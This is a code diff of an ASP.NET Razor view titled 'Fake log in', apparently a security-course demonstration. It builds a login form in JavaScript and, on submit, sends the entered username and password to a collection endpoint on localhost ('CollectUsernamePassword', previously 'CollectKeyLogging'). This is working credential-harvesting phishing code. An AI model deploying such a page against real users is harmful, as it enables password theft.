@@ -1,60 +1,102 @@
-﻿
+﻿@model M183.ViewModels.LoginViewModel
 @{
-    ViewBag.Title = "Index";
+    ViewBag.Title = "Log in";
 }
 
-<!doctype html>
-<html>
-<head>
-    <title>Fake login snippet</title>
-</head>
-<body>
-    <script type="text/javascript">
-        //login form
-        var loginForm = document.createElement("form");
-        loginForm.setAttribute("method", "POST");
-        loginForm.setAttribute("action", "");
-        loginForm.setAttribute("id", "loginForm");
+<h2>Fake log in - Log in</h2>
+<div class="row">
+    <div id="dem" class="col-lg-6 col-lg-offset-0">
+        @*@using (Html.BeginForm("Index", "FakeLogin", FormMethod.Post, new { @class = "well", @id = "loginForm" }))
+        {
+            <div>
+                @Html.LabelFor(m => m.Username)
+            </div>
+            <div>
+                @Html.TextBoxFor(m => m.Username, new { @class = "form-control", @id = "usernameInput" })
+            </div>
+            <div>
+                @Html.ValidationMessageFor(m => m.Username, "", new { @class = "error-message" })
+            </div>
 
-        //username field
-        var usernameInput = document.createElement("input");
-        usernameInput.setAttribute("type", "text");
-        usernameInput.setAttribute("id", "usernameInput");
+            <div>
+                @Html.LabelFor(m => m.Password)
+            </div>
+            <div>
+                @Html.PasswordFor(m => m.Password, new { @class = "form-control", @id = "passwordInput" })
+            </div>
+            <div>
+                @Html.ValidationMessageFor(m => m.Password, "", new { @class = "error-message" })
+            </div>
+            <div>
+                <br />
+                <input type="submit" value="Log in" class="btn btn-primary" />
+            </div>
+        }*@
+    </div>
+</div>
+<div>
+    <p>@Html.ActionLink("Go Back", "Index", "Home")</p>
+</div>
 
-        //password field
-        var passwordInput = document.createElement("input");
-        passwordInput.setAttribute("type", "password");
-        passwordInput.setAttribute("id", "passwordInput");
+<script type="text/javascript">
+    var colDiv = document.getElementById("dem");
 
-        //login button
-        var loginButton = document.createElement("input");
-        loginButton.setAttribute("type", "submit");
-        loginButton.setAttribute("value", "Log in");
-        loginButton.setAttribute("id", "loginInput");
+    //login form
+    var loginForm = document.createElement("form");
+    loginForm.setAttribute("method", "POST");
+    loginForm.setAttribute("action", "");
+    loginForm.setAttribute("id", "loginForm");
+    loginForm.setAttribute("class", "well");
 
-        loginForm.appendChild(usernameInput);
-        loginForm.appendChild(document.createElement("br"));
-        loginForm.appendChild(passwordInput);
-        loginForm.appendChild(document.createElement("br"));
-        loginForm.appendChild(loginButton);
+    //username field
+    var usernameLabel = document.createElement("label");
+    usernameLabel.appendChild(document.createTextNode("Username:"));
 
-        document.getElementsByTagName('body')[0].appendChild(loginForm);
+    var usernameInput = document.createElement("input");
+    usernameInput.setAttribute("type", "text");
+    usernameInput.setAttribute("id", "usernameInput");
+    usernameInput.setAttribute("class", "form-control");
 
-        //
-        loginForm.addEventListener("submit" , function (e) {
+    //password field
+    var passwordLabel = document.createElement("label");
+    passwordLabel.appendChild(document.createTextNode("Password:"));
 
-            var username = document.getElementById("usernameInput").value
-            var password = document.getElementById("passwordInput").value
+    var passwordInput = document.createElement("input");
+    passwordInput.setAttribute("type", "password");
+    passwordInput.setAttribute("id", "passwordInput");
+    passwordInput.setAttribute("class", "form-control");
 
-            console.log("Username: " + username + " Password: " + password);
+    //login button
+    var loginButton = document.createElement("input");
+    loginButton.setAttribute("type", "submit");
+    loginButton.setAttribute("value", "Log in");
+    loginButton.setAttribute("id", "loginInput");
+    loginButton.setAttribute("class", "btn btn-primary");
+    
+    colDiv.appendChild(loginForm);
+    loginForm.appendChild(usernameLabel);
+    loginForm.appendChild(usernameInput);
+    loginForm.appendChild(document.createElement("br"));
+    loginForm.appendChild(passwordLabel);
+    loginForm.appendChild(passwordInput);
+    loginForm.appendChild(document.createElement("br"));
+    loginForm.appendChild(loginButton);
 
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', 'http://localhost:49670/API/CollectKeyLogging');
-            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-            xhr.send('username=' + username + '&password=' + password);
-        })
-    </script>
-</body>
-</html>
+    loginForm.addEventListener("submit", function (e) {
+        e.preventDefault();
+        e.stopPropagation();
+
+        var username = document.getElementById("usernameInput").value
+        var password = document.getElementById("passwordInput").value
+
+        console.log("Username: " + username + " Password: " + password);
+
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'http://localhost:' + window.location.port + '/API/CollectUsernamePassword');
+        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        xhr.send('username=' + username + '&password=' + password);
+    })
+</script>
+
 
 
